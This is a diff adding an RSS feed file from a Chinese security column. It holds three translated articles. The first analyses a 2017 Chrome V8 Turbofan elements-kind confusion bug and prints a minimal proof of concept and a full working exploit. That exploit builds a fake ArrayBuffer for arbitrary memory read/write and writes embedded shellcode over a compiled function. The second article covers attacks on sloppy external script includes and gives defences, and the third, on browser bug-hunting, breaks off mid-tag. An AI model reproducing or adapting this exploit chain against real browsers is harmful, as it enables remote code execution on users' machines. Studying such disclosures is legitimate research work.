@@ -1,0 +1,591 @@
+<?xml version="1.0" encoding="utf-8"?>
+<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
+<channel>
+<title>Twosecurity</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/</link>
+<description>twosecurity.io</description>
+<language>zh-cn</language>
+<lastBuildDate>Thu, 07 Sep 2017 20:16:05 +0800</lastBuildDate>
+<item>
+<title>Chrome Trubofan 优化不当而导致的 RCE</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-06-29097125.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;Chrome Trubofan 优化不当而导致的 RCE&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29097125&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;&lt;b&gt;简述&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;在这篇文章中，我们将介绍 Chrome Turbofan 编译器触发的 RCE。由于其对代码优化方式不当，我们可以通过数值的形式来读取对象（在内存地址中访问到它们），同理，我们也能通过写入数据的方式任意伪造对象。&lt;/p&gt;&lt;h2&gt;对象 map&lt;/h2&gt;&lt;p&gt;每一个对象都用一个 map 来表示对象的结构（键值）。两个结构相同而值不同的对象则会拥有同样的 map。其最常见的表现方法如下：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-58b15ebbdd84bac614920f8993055c38.png_r.jpg&quot; data-rawwidth=&quot;748&quot; data-rawheight=&quot;522&quot;&gt;&lt;p&gt;这里的 map 字段（可以理解为 map 的指针）保存了 map 对象。里面的两个常量数组（Extra&lt;br&gt;Properties, Elements)  则保存了额外的命名属性及其编号属性（又被称为元素）。&lt;/p&gt;&lt;h2&gt;Map转换&lt;/h2&gt;&lt;p&gt;当我们在对象中添加属性，原 map 会失效。为了适应新的结构，系统会创建一个新的 map。与此同时，原始的 map 中会加入转换描述描述符以展示如何讲原 map 更新。比如：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Var obj = {}; // 新建对象，创建Map M0
+obj.x = 1; //添加属性，创建了Map M1，新的Map显示了如何存储x
+obj.y=1; // 类似上一语句&lt;/code&gt;&lt;p&gt;当内联的缓存缺失时，编译器可以利用描述符重重新优化函数。&lt;/p&gt;&lt;h2&gt;元素 (Elements) 种类&lt;/h2&gt;&lt;p&gt;如上所述，对象元素实际上是编号属性的键值。它们通常被保存到被对象所指向的常规数组中。对象 map 中有个名为 `ElementsKind` 的特殊字段。它负责告诉我们该元素数组的值是否为 boxed，unboxed，contiguous，或 sparse。仅仅用元素分类的 map 不会通过转换进行连接。&lt;/p&gt;&lt;h2&gt;V8数组&lt;/h2&gt;&lt;p&gt;V8引擎中的数组为有类型的 &#39;boxed&#39; 或 &#39;unboxed&#39; 数组。这可以帮助我们了解该数组是否只包含了 double 类型的值（interger 也用 double 表示）或者其它更复杂的值，比方说指向对象的指针。因为我们可以直接控制值，前一种情况又叫 *fast array*。&lt;/p&gt;&lt;p&gt;一图胜千言：&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-421e198af13c4d108f8e48040d5fcca6.jpg_r.jpg&quot; data-rawwidth=&quot;1125&quot; data-rawheight=&quot;311&quot;&gt;&lt;p&gt;（数组本身的类型决定其值是 boxed 还是 unboxed）。&lt;/p&gt;&lt;p&gt;假设我们一开始有一个类似左边的数组，现在我们需要将一个对象赋值给这个 fast&lt;br&gt;array，那么整个数组和其存在的值都会变成 boxed。&lt;/p&gt;&lt;h2&gt;V8优化&lt;/h2&gt;&lt;p&gt;V8 编译器先用内联缓存产生即时编译代码，这时其对类型处理相对松散。&lt;/p&gt;&lt;p&gt;谷歌 V8 的文档中，解释如下：&lt;/p&gt;&lt;p&gt;“V8 在第一次执行时会将js编译为机器码。我们不会使用字节码和解释器。但是在执行时，V8会使用其它机器指令修改内联缓存以使其可以访问属性。。。”&lt;/p&gt;&lt;p&gt;”。。。V8 会通过预测来优化执行。如果一个类也会被未来的对象使用，V8 会根据相关信息修改指令已便使用隐藏类。如果预测成功，该属性仅需一次操作即可赋值或取值。反之，V8 会修复这段代码并移除优化。”&lt;/p&gt;&lt;p&gt;因此，编译器只会编译具体类型的代码。如果下一次这段代码执行与编译时不同的类型，编译器会抛出 “inline&lt;br&gt;cache miss” 错误并重编译这段代码。&lt;/p&gt;&lt;p&gt;比方说，我们有函数 `f` 和对象 o1，o2：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;f(arg_obj) {
+return arg_obj.x;
+}
+var o1 = {“x”:1, “y”:2}
+var o2 = {“x”:1, “t”:2}&lt;/code&gt;&lt;p&gt;如果我们先让 f 调用 o1，那么编译器会产生如下代码：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;(ecx holds the argument)
+cmp [ecx + &amp;lt;hidden class offset&amp;gt;], &amp;lt;cached o1 class&amp;gt;
+jne &amp;lt;inline cache miss&amp;gt; - this will execute compiler code
+mov eax, [ecx + &amp;lt;cached x offset&amp;gt;]&lt;/code&gt;&lt;p&gt;当函数再次调用 o2，编译器就会产生 “inline cahce miss”，并重编译这段代码。&lt;/p&gt;&lt;h2&gt;漏洞分析&lt;/h2&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;元素种类转换&lt;/h2&gt;&lt;p&gt;当缓存错误被触发时，编译器会保存转述符且用 `Map::FindElementsKindTransitionedMap` 生成 `ElementsKindTransitions`。之所以使用这种方式，是因为编译器仅需要改变`ElementsKind`。&lt;/p&gt;&lt;h2&gt;稳定的 map&lt;/h2&gt;&lt;p&gt;当代码访问元素时的操作得到了优化，那么这个 map 便是稳定的。&lt;/p&gt;&lt;p&gt;当编译器判断一个函数使用得差不多时，那么它就会进一步优化代码。这时，它会调用函数`ReduceElementAccess`  以减少对对象元素的访问，该函数会继续使用`ComputeElementAccessInfos`。&lt;/p&gt;&lt;p&gt;`ComputeElementAccessInfos` 也会寻找潜在的元素转换以方便优化。&lt;/p&gt;&lt;p&gt;然而当类似的转换是由稳定的 map 产生并使用，问题产生了。它只会影响当前函数，而相同map 里的其它函数则不会被考虑进去。这会产生如下现象：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;优化完函数后，编译器会改变稳定 map 中的元素。另外一个函数以某种方式被优化，使其存储/加载了同一张稳定 map 中的属性。现在，这张 map 的某个对象被创建。第一个函数被调用，使用该对象作为函数参数，然后元素种类会被修改。&lt;/li&gt;&lt;li&gt;第二个函数被调用了，然而并不会产生内联缓存缺失（元素种类转换并转到另一类map，因此不会造成缓存丢失）。&lt;/li&gt;&lt;li&gt;因为缓存没有缺失，函数依然能存储或加载 unboxed 元素，也就是说我们可以读取或写入对象指针数组。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;之前的 commit 中已经提到过这个问题：“如果需要元素种类转换时，请确保源图处于不稳定状态”。&lt;/p&gt;&lt;p&gt;当函数出现了缓存缺失时，编译器会检查是否可以使用元素类型转换来纠正此问题。这个工作是由 `KeyedStoreIC::StoreElementPolymorphicHandler` 和`KeyedLoadIC::LoadElementPolymorphicHandlers` 完成的。我们 diff 一下 commit，就会发现稳定状态的 map 会被修改为不稳定，以保证这个转换会覆盖所有使用该 map 的函数。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c9f31f750ca1922c4c47e78b334e058e.png_r.jpg&quot; data-rawwidth=&quot;1671&quot; data-rawheight=&quot;189&quot;&gt;&lt;p&gt;因此对函数的第一次调用会改变 map 的元素种类，`StoreElementPolymorphicHandlers` 调用&lt;/p&gt;&lt;p&gt;`FindElementsKindTransitionedMap` 来找元素类转换。这样可以确保 map 为不稳定的，从而使使用该 map 的代码被去除优化，且未来的代码不会在该 map 上进行优化。这样能保证元素被正常处理了。&lt;/p&gt;&lt;h2&gt;那么我们应该如何从稳定的 map 中触发元素类转换呢？&lt;/h2&gt;&lt;p&gt;在回答这个问题之前，我们需要了解过期 map。它指的是一个 map 的所有对象已经被替换道另一个 map 中。该 map 被设为不稳定状态，它会被去优化且从转换树中移除。&lt;/p&gt;&lt;p&gt;如果我们看一看 `ComputeElementAccessInfos` 的源码，我们就会发现在`FindElementsKindTransitionedMap` 前，`TryUpdate` 会先被执行。&lt;/p&gt;&lt;p&gt;当 `TryUpdate` 接收到过期 map 时，它会寻找其所在的树（就是来自同一个根 map 且经过相同转换所形成的树）中寻找另一张没过时的图，并将其返回（如果存在）。&lt;/p&gt;&lt;p&gt;元素种类转换所对应的原始的 map 会在 `LoadElementPolymorphicHandlers` 中被设置为不稳定状态，并成为过时 map。TryUpdate 找到另一张 map，然后会切换到这张图。但这张图不会被用于优化这个函数，因此会一直被设为稳定状态，因此，我们可以从该 map 中得到元素种类转换。&lt;/p&gt;&lt;p&gt;事实上，源代码已经有一个检查来确保稳定的 map 不会产生转换状态，然而这段代码不会影响 Chrome59。&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-7affb3b4e042204c3fda07d1665d5ca8.png_r.jpg&quot; data-rawwidth=&quot;748&quot; data-rawheight=&quot;248&quot;&gt;&lt;h2&gt;最简 PoC：&lt;/h2&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
+// 这个函数改变元素的动作会被优化
+function change_elements_kind(a){
+a[0] = Array;
+}
+// 这个函数则会被优化值的读取，
+function read_as_unboxed(){
+return evil[0];
+}
+
+// 为了编译该函数，我们需要先调用它
+change_elements_kind({});
+
+// 新建对象M0
+map_manipulator = new Array(1.0,2.3);
+// 添加x到M0,由于值的更改，M0则会被变换册M1
+map_manipulator.x = 7;
+// 用这个对象调用函数，V8会生成M1版的函数
+change_elements_kind(map_manipulator);
+
+// 改变x的原型类型，前一个x会从M0和M1中移除。编译器标记M1为过时，并产生M2
+map_manipulator.x = {};
+
+
+
+// 生成有漏洞的对象
+evil = new Array(1.1,2.2);
+evil.x = {};
+
+x = new Array({});
+// 优化change_elements_kind
+// ReduceElementAccess会被调用，ReduceElementAccess会被调用，这个函数又会使用ComputeElementAccessInfos。
+// 下面这个循环中，由于x和M2有着相同的属性，编译器会为M2添加元素类型转换
+for(var i = 0;i&amp;lt;0x50000;i++){
+change_elements_kind(x);
+} 
+
+// 优化read_as_unboxed. Evil是M2 map的一个实例，因此函数对元素的读取会被优化
+for(var i = 0;i&amp;lt;0x50000;i++){
+read_as_unboxed();
+}
+
+change_elements_kind(evil);
+
+// 调用read_as_unboxed，它依然是M2，不过这个版本会假设元素数组中的值为unboxed。因此Array构造函数的指针会被当双精度返回。
+alert(read_as_unboxed());
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;h2&gt;完整 PoC：&lt;/h2&gt;&lt;p&gt;下面的 Poc 可以在 Chrome59 -no-sandbox 模式下运行并弹出计算器，我们的思路如下：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;用漏洞读取 `arraybuffer.__proto__` 的地址&lt;/li&gt;&lt;li&gt;我们创建假的 arraybuffer map（通过 arraybuffer 原型指向的地址），再读取该 map 的地址&lt;/li&gt;&lt;li&gt;利用 map 的地址，我们即可创建 arraybuffer。再次得到其地址。&lt;/li&gt;&lt;li&gt;通过创建的 arraybuffer，我们可以向 boxed元素数组中写入指针。另外，我们也可以修改 arraybuffer，让其反射用户态内存。再一次利用这个漏洞，读取已编译函数的地址，然后使用读/写权限将我们的 shellcode 覆盖这个地址，最后，调用这个函数执行我们的 shellcode。&lt;/li&gt;&lt;/ul&gt;&lt;code lang=&quot;js&quot;&gt;&amp;lt;script&amp;gt;
+
+var shellcode =
+[0xe48348fc,0x00c0e8f0,0x51410000,0x51525041,0xd2314856,0x528b4865,0x528b4860,0x528b4818,0x728b4820,0xb70f4850,0x314d4a4a,0xc03148c9,0x7c613cac,0x41202c02,0x410dc9c1,0xede2c101,0x48514152,0x8b20528b,0x01483c42,0x88808bd0,0x48000000,0x6774c085,0x50d00148,0x4418488b,0x4920408b,0x56e3d001,0x41c9ff48,0x4888348b,0x314dd601,0xc03148c9,0xc9c141ac,0xc101410d,0xf175e038,0x244c034c,0xd1394508,0x4458d875,0x4924408b,0x4166d001,0x44480c8b,0x491c408b,0x8b41d001,0x01488804,0x415841d0,0x5a595e58,0x59415841,0x83485a41,0x524120ec,0x4158e0ff,0x8b485a59,0xff57e912,0x485dffff,0x000001ba,0x00000000,0x8d8d4800,0x00000101,0x8b31ba41,0xd5ff876f,0xa2b5f0bb,0xa6ba4156,0xff9dbd95,0xc48348d5,0x7c063c28,0xe0fb800a,0x47bb0575,0x6a6f7213,0x89415900,0x63d5ffda,0x00636c61]
+
+var arraybuffer = new ArrayBuffer(20);
+flag = 0;
+function gc(){
+for(var
+i=0;i&amp;lt;0x100000/0x10;i++){
+new String;
+}
+}
+function d2u(num1,num2){
+d = new Uint32Array(2);
+d[0] = num2;
+d[1] = num1;
+f = new
+Float64Array(d.buffer);
+return f[0];
+}
+function u2d(num){
+f = new Float64Array(1);
+f[0] = num;
+d = new
+Uint32Array(f.buffer);
+return d[1] * 0x100000000
++ d[0];
+}
+function change_to_float(intarr,floatarr){
+var j = 0;
+for(var i = 0;i &amp;lt;
+intarr.length;i = i+2){
+var re =
+d2u(intarr[i+1],intarr[i]);
+floatarr[j] = re;
+j++;
+}
+}
+function change_elements_kind_array(a){
+a[0] = Array;
+}
+optimizer3 = new Array({});
+optimizer3.x3 = {};
+change_elements_kind_array(optimizer3);
+map_manipulator3 = new Array(1.1,2.2);
+map_manipulator3.x3 = 0x123;
+change_elements_kind_array(map_manipulator3);
+
+map_manipulator3.x3 = {};
+
+evil3 = new Array(1.1,2.2);
+evil3.x3 = {};
+for(var i = 0;i&amp;lt;0x100000;i++){
+change_elements_kind_array(optimizer3);
+}
+
+/******************************* step 1 read ArrayBuffer __proto__ address ***************************************/
+function change_elements_kind_parameter(a,obj){
+arguments;
+a[0] = obj;
+}
+optimizer4 = new Array({});
+optimizer4.x4 = {};
+change_elements_kind_parameter(optimizer4);
+map_manipulator4 = new Array(1.1,2.2);
+map_manipulator4.x4 = 0x123;
+change_elements_kind_parameter(map_manipulator4);
+
+map_manipulator4.x4 = {};
+
+evil4 = new Array(1.1,2.2);
+evil4.x4 = {};
+for(var i = 0;i&amp;lt;0x100000;i++){
+change_elements_kind_parameter(optimizer4,arraybuffer.__proto__);
+}
+
+function e4(){
+return evil4[0];
+}
+
+for(var i = 0;i&amp;lt;0x100000;i++){
+e4();
+}
+
+change_elements_kind_parameter(evil4,arraybuffer.__proto__);
+ab_proto_addr = u2d(e4());
+
+var nop = 0xdaba0000;
+var ab_map_obj = [
+nop,nop,
+0x1f000008,0x000900c3, //chrome
+59
+//0x0d00000a,0x000900c4, //chrome
+61
+0x082003ff,0x0,
+nop,nop, // use ut32.prototype replace it
+nop,nop,0x0,0x0
+]
+ab_constructor_addr = ab_proto_addr - 0x70;
+ab_map_obj[0x6] = ab_proto_addr &amp;amp; 0xffffffff;
+ab_map_obj[0x7] = ab_proto_addr / 0x100000000;
+ab_map_obj[0x8] = ab_constructor_addr &amp;amp; 0xffffffff;
+ab_map_obj[0x9] = ab_constructor_addr / 0x100000000;
+float_arr = [];
+
+gc();
+var ab_map_obj_float = [1.1,1.1,1.1,1.1,1.1,1.1];
+change_to_float(ab_map_obj,ab_map_obj_float);
+
+/******************************* step 2 read fake_ab_map_ address ***************************************/
+
+change_elements_kind_parameter(evil4,ab_map_obj_float);
+ab_map_obj_addr = u2d(e4())+0x40;
+
+var fake_ab = [
+ab_map_obj_addr &amp;amp;
+0xffffffff, ab_map_obj_addr / 0x100000000,
+ab_map_obj_addr &amp;amp;
+0xffffffff, ab_map_obj_addr / 0x100000000,
+ab_map_obj_addr &amp;amp;
+0xffffffff, ab_map_obj_addr / 0x100000000,
+0x0,0x4000, /* buffer
+length */
+0x12345678,0x123,/* buffer
+address */
+0x4,0x0
+]
+var fake_ab_float = [1.1,1.1,1.1,1.1,1.1,1.1];
+change_to_float(fake_ab,fake_ab_float);
+
+/******************************* step 3 read fake_ArrayBuffer_address ***************************************/
+
+change_elements_kind_parameter(evil4,fake_ab_float);
+fake_ab_float_addr = u2d(e4())+0x40;
+
+/******************************* step 4 fake a ArrayBuffer ***************************************/
+
+fake_ab_float_addr_f = d2u(fake_ab_float_addr /
+0x100000000,fake_ab_float_addr &amp;amp; 0xffffffff).toString();
+
+eval(&#39;function e3(){ evil3[1]
+= &#39;+fake_ab_float_addr_f+&#39;;}&#39;)
+for(var i = 0;i&amp;lt;0x6000;i++){
+e3();
+}
+change_elements_kind_array(evil3);
+e3();
+fake_arraybuffer = evil3[1];
+if(fake_arraybuffer instanceof ArrayBuffer == true){
+}
+fake_dv = new DataView(fake_arraybuffer,0,0x4000);
+
+/******************************* step 5 Read a Function Address ***************************************/
+
+var func_body = &quot;eval(&#39;&#39;);&quot;;
+
+var function_to_shellcode = new Function(&quot;a&quot;,func_body);
+
+change_elements_kind_parameter(evil4,function_to_shellcode);
+
+shellcode_address_ref = u2d(e4()) + 0x38-1;
+
+/************************************** And now,we get arbitrary memory read
+write!!!!!! ******************************************/
+
+function Read32(addr){
+fake_ab_float[4] =
+d2u(addr / 0x100000000,addr &amp;amp; 0xffffffff);
+return
+fake_dv.getUint32(0,true);
+}
+function
+Write32(addr,value){
+fake_ab_float[4] =
+d2u(addr / 0x100000000,addr &amp;amp; 0xffffffff);
+alert(&quot;w&quot;);
+fake_dv.setUint32(0,value,true);
+}
+shellcode_address =
+Read32(shellcode_address_ref) + Read32(shellcode_address_ref+0x4) *
+0x100000000;;
+
+var addr =
+shellcode_address;
+
+fake_ab_float[4] =
+d2u(addr / 0x100000000,addr &amp;amp; 0xffffffff);
+for(var i = 0; i &amp;lt;
+shellcode.length;i++){
+var value =
+shellcode[i]; 
+fake_dv.setUint32(i *
+4,value,true);
+}
+alert(&quot;boom&quot;);
+function_to_shellcode();
+
+&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;a href=&quot;https://blogs.securiteam.com/index.php/archives/3379&quot;&gt;https://blogs.securiteam.com/index.php/archives/3379&lt;/a&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-09-06-29097125</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>引用外部脚本的隐患及防御</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-09-03-29016122.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;引用外部脚本的隐患及防御&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/29016122&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在这篇文章里，我们将换一个姿势利用 XSS。通常来讲，XSS 是由程序对输入缺乏合理的过滤而产生的。但在这篇文章里，我会展示如何在正确过滤 XSS 的网站中利用 XSS。它和常规攻击手段类似，我们也可以用它来偷 cookie 或者钓鱼。不过在之前，我们先来讲解一下跨域资源共享技术。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;跨域资源共享&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;跨域资源能够提供浏览器更好的用户体验。通过它，我们可以在一个网站上访问到不属于它域下的资源（比如图像，javascript，以及其它数据）。打个比方：&lt;/p&gt;&lt;p&gt;http://example.com 有如下跨域资源：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;通过 XMLHttpRequest 请求securelayer7.net已登陆用户的数据&lt;/li&gt;&lt;li&gt;用&amp;lt;iframe src&amp;gt;标签包含http://youtube.com&lt;/li&gt;&lt;li&gt;用&amp;lt;img src&amp;gt;请求http://imgur.com的图片&lt;/li&gt;&lt;li&gt;用&amp;lt;script src&amp;gt;请求https://code.jquery.com/jquery-1.8.1.min.js取得的javascript库&lt;/li&gt;&lt;/ul&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-bf7b5a58535ca4b4221670bd0e59b7cb.png_r.jpg&quot; data-rawwidth=&quot;656&quot; data-rawheight=&quot;504&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;&lt;b&gt;为什么要引用脚本，而不是直接内联？&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;当许多网站同时引用&amp;lt;script src=”https://code.jquery.com/jquery-1.8.1.min.js”&amp;gt;&amp;lt;/script&amp;gt;时，浏览器只需加载一次，便可以将其载入缓存方便不同网站对其的调用。&lt;/p&gt;&lt;p&gt;为什么我们又需要加载外部的javascript库呢？答案很简单，方便开发。在 jQuery 中，我们只需短短的一句，就可以改变背景颜色：$(‘body’).css(&#39;background&#39;, &#39;#ccc&#39;);&lt;/p&gt;&lt;p&gt;如果直接用原生 JavaScript 操作 DOM 的话，我们就得：&lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;Function changeBachground(color) {
+  Document.body.style.background = color;
+}
+ 
+Onload=&quot;changeBackground(&#39;red&#39;);&quot; //某个事件
+&lt;/code&gt;&lt;h2&gt;&lt;b&gt;由 javascript 引用而导致的漏洞&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;由于控制权的缺失，加载第三方控制的脚本有十分严重的安全隐患。第三方网站的站长有可能在脚本中插入恶意代码。或者网站自身有漏洞而被攻击者所控制，最终导致攻击者篡改其提供的脚本。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;攻击从本地加载的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;假设在一个开发环境中，工程师用&amp;lt;script src=&quot;http://127.0.0.1:4545/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;加载本地Web服务器上的资源。如果在发布该应用时没有移除这个语句，那么攻击者可以使用如下手段来攻击目标：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;登陆运行该应用的电脑（物理渗透，SSRF）&lt;/li&gt;&lt;li&gt;用一个 Web 服务器监听本地4545端口，并返回恶意js。&lt;/li&gt;&lt;li&gt;目标在该电脑上开启浏览器，进入这个程序&lt;/li&gt;&lt;li&gt;浏览器加载恶意 JavaScript，导致XSS&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;攻击从局域网加载的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;继续假设一个开发环境，开发者用脚本来加载内部服务器的资源：&amp;lt;script src=&quot;http://192.168.0.111/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;。这时候，攻击者也可以按照类似攻击本地资源的手法插入恶意脚本，只不过需要锁定一个ip罢了（SSRF，内网渗透，物理渗透）。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;源于未注册域名的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;很多时候，工程师会在host文件中加入自定义的域名。这样一来省钱，二来不用部署。或者有些已经注册的域名忘记续费而过期了，如果发布时碰巧忘记移除它（比如&amp;lt;script src=&quot;https://securelayer7.net/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;）。那么攻击者便有机可乘了：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;注册securelayer7.net并返回import.js&lt;/li&gt;&lt;li&gt;用户浏览时会加载我们的恶意脚本&lt;/li&gt;&lt;/ul&gt;&lt;h2&gt;&lt;b&gt;加载动态 ip 的脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;开发者很有可能会犯将 ip 设为动态这种低级错误。我们只需想办法获取该 ip 地址的控制权（思路也和内网类似），便可以攻击目标了。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;因为输入加载错误的域名&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;很多时候，开发者会漏打或者错打域名（比方说：&amp;lt;script src=&quot;https://code.jqueri.com/import.js&quot;&amp;gt;&amp;lt;/script&amp;gt;）我们可以趁机注册该域名并返回恶意代码&lt;/p&gt;&lt;h2&gt;&lt;b&gt;从一个运行 HTTP 的服务器加载脚本&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;如果一个脚本是用HTTP（不是HTTPS）传输的，那么我们可以用中间人攻击（arp攻击，icmp攻击）来篡改脚本并在其中注入内容。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;防护措施&lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;从本地或者内网 ip 加载的脚本都要被替换成其它安全位置的脚本&lt;/li&gt;&lt;li&gt;严格管控现有的域名，确保知道哪些过期了，哪些没有&lt;/li&gt;&lt;li&gt;脚本不应该从动态 ip 中引入&lt;/li&gt;&lt;li&gt;再三检查输入域名是否配对真实域名&lt;/li&gt;&lt;li&gt;尽可能地使用 https&lt;/li&gt;&lt;li&gt;脚本应该尽量存放在安全性高的第三方网站&lt;/li&gt;&lt;li&gt;如果你不能保证上述几点，不要因为追求性能而无视安全性（引用脚本改成内联）&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;&lt;i&gt;作者：&lt;b&gt;Saurabh Banawar —— &lt;a href=&quot;http://blog.securelayer7.net/owasp-top-10-cross-site-scripting-3-bad-javascript-imports/&quot;&gt;http://blog.securelayer7.net/owasp-top-10-cross-site-scripting-3-bad-javascript-imports/&lt;/a&gt;&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;</description>
+<author>Twosecurity</author>
+<guid isPermaLink="false">2017-09-03-29016122</guid>
+<pubDate>Sun, 01 Jan 2017 00:00:00 +0800</pubDate>
+</item>
+<item>
+<title>浏览器漏洞挖掘思路</title>
+<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-08-23-28719766.htm</link>
+<description>&lt;meta charset=&quot;utf-8&quot;&gt;
+&lt;title&gt;浏览器漏洞挖掘思路&lt;/title&gt;
+&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/28719766&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;在 Web 安全中，服务端一直扮演着十分重要的角色。然而浏览器的问题也不容小觑，它也会导致信息泄露等诸如此类的问题。然而许多人还没有意识到浏览器对于安全的重要性。在这篇讲座（文章）中，我们会给读者带来挖掘浏览器漏洞的思路。&lt;/p&gt;&lt;h2&gt;&lt;b&gt;挖掘漏洞的思路&lt;/b&gt;&lt;/h2&gt;&lt;h2&gt;&lt;b&gt;确定目标&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;我们先来看看浏览器的大概结构：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;DOM 解析 （HTML, XML, SVG, MathML, XUL）&lt;/li&gt;&lt;li&gt;脚本处理 （JavaScript, VBScript, asm.js, WebAssembly）&lt;/li&gt;&lt;li&gt;协议支持 （HTTP, FTP, WebSocket, HTTP/2, QUIC, DNS, mDNS, WebRTC）&lt;/li&gt;&lt;li&gt;媒体流支持 （JPG, GIF, PNG, WebM, Ogg, AAC, MP3, MP4, FLAC）&lt;/li&gt;&lt;li&gt;包含的中间件（Skia, ffmpeg, ICU, NSS, OpenVR, libpng, sqlite）&lt;/li&gt;&lt;li&gt;各种 API（Fetch API, Push API, Extension API, Fullscreen API, Web Speech API）&lt;/li&gt;&lt;li&gt;UI 组建（Location Bar, History, Bookmark, Context Menu）&lt;/li&gt;&lt;li&gt;安全功能（SOP, XSS Filter, CSP, SRI, TLS, Mixed Content, HSTS, HPKP, CT）&lt;/li&gt;&lt;li&gt;便利功能（Chrome Extension, Reading View, Secret Mode）&lt;/li&gt;&lt;li&gt;其它&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;我们应该如何从诸多功能中选取攻击目标？这时，我们可以这样入手：&lt;/p&gt;&lt;h2&gt;&lt;b&gt;检查新功能&lt;/b&gt;&lt;/h2&gt;&lt;p&gt;刚刚公布的功能往往没有被太多的人研究，因此更有可能存在潜在的隐患。因此，我们可以试着在下列产品挖掘漏洞：&lt;/p&gt;&lt;ul&gt;&lt;li&gt;Firefox Nightly&lt;/li&gt;&lt;li&gt;Chrome Dev, Canary&lt;/li&gt;&lt;li&gt;Safari Technology Preview&lt;/li&gt;&lt;li&gt;Edge的最新版本&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;更新时，我们最好注意一下它们的发行日记或者开发者的 blog。这样我们可以在最短的时间内得知新加入的特性。&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-a72d7f79e57a6b71c628133327a02c2b.png_r.jpg&quot; data-rawwidth=&quot;1443&quot; data-rawheight=&quot;802&quot;&gt;&lt;p&gt;Firefox 在该版本中提供了 link 预加载，这看上去十分有趣!这时，白帽子们可以以此功能为基础，对其进行安全检测，或者思考能否用它扩展供给面。&lt;/p&gt;&lt;p&gt;这是能让我们获取一手消息的相关平台：&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-d40caea4feadfe3a02b054646eca5ce3.png_r.jpg&quot; data-rawwidth=&quot;1414&quot; data-rawheight=&quot;800&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-2924dbf45789ca2671a1958ee68303a1.png_r.jpg&quot; data-rawwidth=&quot;1422&quot; data-rawheight=&quot;796&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-38275fbaa221dddae9e46d09d8cc6983.png_r.jpg&quot; data-rawwidth=&quot;1419&quot; data-rawheight=&quot;800&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-c487104798c0c32b6a535fdfe87e3add.png_r.jpg&quot; 